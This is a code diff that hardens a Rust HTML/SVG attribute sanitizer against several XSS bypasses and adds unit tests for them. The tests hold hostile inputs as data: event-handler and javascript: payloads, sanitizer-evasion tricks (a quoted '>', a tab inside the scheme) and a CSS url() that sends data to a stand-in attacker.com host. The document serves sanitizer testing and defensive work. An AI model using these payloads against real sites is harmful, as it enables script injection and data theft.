@@ -952,8 +952,10 @@ fn strip_dangerous_attrs(input: &str) -> String {
 
     while pos < bytes.len() {
         if bytes[pos] == b'<' && pos + 1 < bytes.len() && bytes[pos + 1] != b'/' {
-            // Inside an opening tag — copy tag name, then filter attributes.
-            if let Some(gt) = bytes[pos..].iter().position(|&b| b == b'>') {
+            // Inside an opening tag — find the closing `>` using
+            // quote-aware scanning so that `>` inside attribute values
+            // (e.g. title=">") does not prematurely end the tag.
+            if let Some(gt) = find_tag_end(&bytes[pos..]) {
                 let tag_end = pos + gt + 1;
                 let tag_content = &input[pos..tag_end];
                 result.push_str(&sanitize_tag_attrs(tag_content));
@@ -974,13 +976,38 @@ fn strip_dangerous_attrs(input: &str) -> String {
     result
 }
 
+/// Find the index of the closing `>` of an opening tag, skipping `>` characters
+/// inside quoted attribute values (`"..."` or `'...'`).
+fn find_tag_end(bytes: &[u8]) -> Option<usize> {
+    let mut i = 0;
+    let mut in_quote: Option<u8> = None;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = in_quote {
+            if b == q {
+                in_quote = None;
+            }
+        } else if b == b'"' || b == b'\'' {
+            in_quote = Some(b);
+        } else if b == b'>' {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
 /// Check if a URI value starts with a dangerous scheme (`javascript:`,
 /// `vbscript:`, `data:`), ignoring leading whitespace and case.
 fn has_dangerous_uri_scheme(value: &str) -> bool {
-    let trimmed = value.trim_start();
-    let lower: String = trimmed
+    // Strip leading whitespace, then remove embedded ASCII control characters
+    // and whitespace within the scheme portion to defend against obfuscation
+    // like `java\tscript:` which some older browsers tolerated.
+    let lower: String = value
+        .trim_start()
         .chars()
-        .take(20)
+        .take(30)
+        .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
         .flat_map(|c| c.to_lowercase())
         .collect();
     lower.starts_with("javascript:") || lower.starts_with("vbscript:") || lower.starts_with("data:")
@@ -1045,14 +1072,8 @@ fn sanitize_tag_attrs(tag: &str) -> String {
         let attr_name = &tag[attr_start..i];
 
         let is_event_handler = attr_name.len() > 2
-            && (attr_name.starts_with("on")
-                || attr_name.starts_with("ON")
-                || attr_name.starts_with("On")
-                || attr_name.starts_with("oN"))
-            && attr_name[2..]
-                .chars()
-                .next()
-                .is_some_and(|c| c.is_ascii_alphabetic());
+            && attr_name.as_bytes()[..2].eq_ignore_ascii_case(b"on")
+            && attr_name.as_bytes()[2].is_ascii_alphabetic();
 
         // Extract the attribute value (if any) without copying yet.
         let value_start = i;
@@ -1089,6 +1110,20 @@ fn sanitize_tag_attrs(tag: &str) -> String {
             if let Some(ref val) = attr_value {
                 if has_dangerous_uri_scheme(val) {
                     // Strip the attribute if it uses a dangerous URI scheme.
+                    continue;
+                }
+            }
+        }
+
+        // Strip style attributes that contain url() or expression() to
+        // prevent CSS-based data exfiltration via network requests.
+        if attr_name.eq_ignore_ascii_case("style") {
+            if let Some(ref val) = attr_value {
+                let lower_val: String = val.chars().flat_map(|c| c.to_lowercase()).collect();
+                if lower_val.contains("url(")
+                    || lower_val.contains("expression(")
+                    || lower_val.contains("@import")
+                {
                     continue;
                 }
             }
@@ -1421,6 +1456,56 @@ mod sanitize_tag_attrs_tests {
         let result = sanitize_tag_attrs(tag);
         assert!(result.contains("日本語テスト"));
         assert!(result.contains("x=\"10\""));
+    }
+
+    // --- Case-insensitive event handler detection (#663) ---
+
+    #[test]
+    fn test_strips_mixed_case_event_handler() {
+        let tag = "<svg OnClick=\"alert(1)\" width=\"100\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("OnClick"));
+        assert!(result.contains("width"));
+    }
+
+    #[test]
+    fn test_strips_uppercase_event_handler() {
+        let tag = "<svg ONLOAD=\"alert(1)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("ONLOAD"));
+    }
+
+    // --- Style attribute sanitization (#654) ---
+
+    #[test]
+    fn test_strips_style_with_url() {
+        let tag =
+            "<rect style=\"background-image: url('https://attacker.com/exfil')\" width=\"10\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+        assert!(result.contains("width"));
+    }
+
+    #[test]
+    fn test_strips_style_with_expression() {
+        let tag = "<rect style=\"width: expression(alert(1))\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_strips_style_with_import() {
+        let tag = "<rect style=\"@import url(evil.css)\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(!result.contains("style"));
+    }
+
+    #[test]
+    fn test_preserves_safe_style() {
+        let tag = "<rect style=\"fill: red; stroke: blue\" width=\"10\">";
+        let result = sanitize_tag_attrs(tag);
+        assert!(result.contains("style"));
+        assert!(result.contains("fill: red"));
     }
 }
 
@@ -2787,5 +2872,51 @@ mod delegate_tests {
             sanitized.contains("<text>safe</text>"),
             "content after stripped self-closing element must be preserved"
         );
+    }
+
+    // --- Quote-aware tag boundary scan (#646) ---
+
+    #[test]
+    fn test_strip_dangerous_attrs_gt_in_double_quoted_attr() {
+        // `>` inside title=">" should not split the tag.
+        let input = r#"<rect title=">" onload="alert(1)"/>"#;
+        let result = strip_dangerous_attrs(input);
+        assert!(
+            !result.contains("onload"),
+            "onload after quoted > must be stripped"
+        );
+        assert!(result.contains("title"));
+    }
+
+    #[test]
+    fn test_strip_dangerous_attrs_gt_in_single_quoted_attr() {
+        let input = "<rect title='>' onload=\"alert(1)\"/>";
+        let result = strip_dangerous_attrs(input);
+        assert!(
+            !result.contains("onload"),
+            "onload after single-quoted > must be stripped"
+        );
+    }
+
+    // --- URI scheme with embedded whitespace/control chars (#655) ---
+
+    #[test]
+    fn test_dangerous_uri_scheme_with_embedded_tab() {
+        assert!(has_dangerous_uri_scheme("java\tscript:alert(1)"));
+    }
+
+    #[test]
+    fn test_dangerous_uri_scheme_with_embedded_newline() {
+        assert!(has_dangerous_uri_scheme("java\nscript:alert(1)"));
+    }
+
+    #[test]
+    fn test_dangerous_uri_scheme_with_control_chars() {
+        assert!(has_dangerous_uri_scheme("java\x00script:alert(1)"));
+    }
+
+    #[test]
+    fn test_safe_uri_not_flagged() {
+        assert!(!has_dangerous_uri_scheme("https://example.com"));
     }
 }
